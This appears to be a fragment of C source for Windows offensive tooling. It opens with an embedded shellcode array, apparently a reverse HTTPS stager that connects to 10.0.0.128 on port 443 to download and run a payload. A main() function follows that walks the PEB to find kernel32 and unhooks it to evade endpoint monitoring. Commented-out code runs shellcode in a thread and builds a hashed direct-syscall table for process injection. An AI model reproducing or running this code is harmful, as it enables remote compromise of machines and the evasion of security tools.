"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x8b\x48\x18\x49\x01"
"\xd0\x50\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
"\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
"\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00"
"\x00\x00\xff\xd5\xe8\x0b\x00\x00\x00\x31\x30\x2e\x30\x2e"
"\x30\x2e\x31\x32\x38\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb"
"\x01\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57"
"\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\x7e\x00\x00\x00"
"\x2f\x70\x6f\x72\x69\x51\x77\x45\x44\x6f\x65\x4d\x2d\x6b"
"\x7a\x2d\x52\x57\x50\x6f\x5f\x72\x51\x2d\x78\x6a\x69\x74"
"\x73\x42\x4a\x42\x69\x66\x36\x5f\x36\x4e\x32\x51\x38\x6f"
"\x4a\x42\x39\x66\x75\x75\x75\x4e\x62\x56\x6a\x70\x4c\x6f"
"\x50\x48\x31\x65\x7a\x53\x6c\x66\x5f\x4d\x50\x48\x72\x47"
"\x4f\x68\x68\x6c\x55\x39\x39\x4f\x4d\x6f\x6f\x71\x7a\x48"
"\x6b\x6f\x6e\x78\x48\x50\x4e\x46\x75\x50\x39\x37\x52\x58"
"\x73\x68\x72\x6b\x6b\x39\x68\x69\x69\x4f\x57\x52\x58\x54"
"\x68\x74\x34\x74\x72\x52\x7a\x6a\x5a\x75\x71\x53\x76\x00"
"\x48\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8\x00"
"\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb"
"\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1"
"\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04"
"\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5"
"\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9"
"\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75"
"\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0"
"\x00\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8"
"\x55\x00\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2"
"\x10\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5"
"\x00\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48"
"\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49\x89"
"\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48"
"\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85"
"\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a"
"\x41\x89\xda\xff\xd5";

int main() {

    initializeSystemCalls();

 //   STARTUPINFOA Si = { 0 };
 //   PROCESS_INFORMATION Pi = { 0 };
 //   BOOL success = FALSE;
 //   success = CreateProcessA("C:\\Windows\\System32\\Rdpclip.exe", NULL,
 //       NULL, //p handle cannot be inheritied by child process
 //       NULL, //thread handle cannot be inheritied yb child since NULL
 //       PROCESS_ALL_ACCESS,
 //       CREATE_SUSPENDED,
 //       NULL, //use def environmen vars
 //       NULL, //inherit current dir as parent.
 //       &Si,
 //       &Pi
 //   );

    PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
    //Read from GS register at 0x30 offset for TEB
    //Using TEB we can find PEB
    PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
    PVOID pNtdllBase = NULL;
    PVOID pDLLBase = NULL;
    printf("Getting base...\n");


    //Now with the PEB address we can find the base of NTDLL to assist in finding fuynciton syscall instructions
    //To do this we must navigate through the PEB_LDR_DATA struct which contains all the loaded modules in the process.
    getchar();
    wchar_t* DLLPath = L"C:\\Windows\\System32\\KERNEL32.DLL";
    GetBase(pCurrentPEB, &pDLLBase,DLLPath);
    wprintf(L"Returned to main... %s Base: 0x%p\n", DLLPath, pDLLBase);
    getchar();

    //Now with the base address of NTDLL we need to get all of the functions within it, the Image Export Directory
    PIMAGE_EXPORT_DIRECTORY ppImageExportDirectory = NULL;
    DWORD dwDLLSize = 0; // expirementally about how many functions to expect :shrug:
    
    PVOID pTextSection = NULL;
    DWORD sText = NULL;
    
    GetImageExportDir(pDLLBase, &ppImageExportDirectory, &pTextSection, &sText);
    printf("Main\n");
    //printf("DLL Size (bytes): %d\n", dwDLLSize);
    wprintf(L"Return to main... Hooked %s .text section: 0x%p\n", DLLPath,pTextSection); //working

    PCWSTR NtdllPath = L"\\??\\C:\\windows\\system32\\kernel32.dll"; //This should probably be hashed
    PVOID pCleanPointerNtdll = NULL;
    HANDLE hFile = NULL;
    hFile = FetchCleanPointer(NtdllPath, pCleanPointerNtdll);
    if (hFile == NULL) {
        printf("main bruhhhhhhh");
    }
    printf("About to unhook\n");
    getchar();
    UnhookDLL(pDLLBase, pCleanPointerNtdll, hFile);
    getchar();
    return 0;

/*
    SIZE_T sWritten = 0;
    PDWORD oldProt = 0;
    PVOID Bruh = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
    if (!VirtualProtect(Bruh,sizeof(buf), PAGE_EXECUTE_READWRITE,&oldProt)) {
        printf("bleh");
    }
    memcpy(Bruh, buf, sizeof(buf));
    LPWORD threadID = 0;

    */
    //HANDLE hThread = CreateThread(NULL, NULL, Bruh, NULL,NULL, NULL);
    //if (hThread == NULL) {
    //    printf("bhalh");
   // }
    //WaitForSingleObject(hThread, INFINITE);
    
    
    /*
    VX_TABLE_ENTRY Write = { 0 };
    VX_TABLE_ENTRY Read = { 0 };
    VX_TABLE_ENTRY Allocate = { 0 };
    VX_TABLE_ENTRY Protect = { 0 };
    VX_TABLE_ENTRY ResumeThread = { 0 };
    VX_TABLE_ENTRY QueryInfoProcess = { 0 };
    VX_TABLE_ENTRY Create = { 0 };
    VX_TABLE_ENTRY MapViewOfSection= { 0 };

    //Hashes retrieved from Hasher code
    VxTable.Write = Write;
    VxTable.Write.dwHash = strtoull("C1189C40", NULL, 16);

    VxTable.Read = Read;
    VxTable.Read.dwHash = strtoull("BE6B6431", NULL, 16);

    VxTable.Allocate = Allocate;
    VxTable.Allocate.dwHash = strtoull("FE83CCDA", NULL, 16);

    VxTable.Protect = Protect;
    VxTable.Protect.dwHash = strtoull("87C51496", NULL, 16);

    VxTable.ResumeThread = ResumeThread;
    VxTable.ResumeThread.dwHash = strtoull("2F7CB09E", NULL, 16);

    VxTable.QueryInfoProcess = QueryInfoProcess;
    VxTable.QueryInfoProcess.dwHash = strtoull("4F0DBC50", NULL, 16);

    VxTable.Create = Create;
    VxTable.Create.dwHash = strtoull("1A862429", NULL, 16);

    VxTable.MapViewOfSection= MapViewOfSection;
    VxTable.MapViewOfSection.dwHash = strtoull("CB5EF918", NULL, 16);

    printf("0x%0.8X\n", VxTable.Protect.dwHash);

    printf("Struct populated...\n");

    //Now with the image export directory we can loop through function names and find the desired functions for syscalls!
    printf("Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %d\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);

    // i wish there was a way to pass the entire struct and then loop through this

    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Read);
    VxTable.Read.wRCXVal = 0;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Write);
    VxTable.Write.wRCXVal = 1;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Allocate);
    VxTable.Allocate.wRCXVal = 2;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Protect);
    VxTable.Protect.wRCXVal = 3;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.ResumeThread);
    VxTable.ResumeThread.wRCXVal = 4;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.QueryInfoProcess);
    VxTable.QueryInfoProcess.wRCXVal = 5;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Create);
    VxTable.Create.wRCXVal = 6;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.MapViewOfSection);
    VxTable.MapViewOfSection.wRCXVal =7;
    //detectDebug();

    printf("Second run: Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %hu\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
    //Now we just have to call the function using assembly temmplates!
    getchar();

    */

}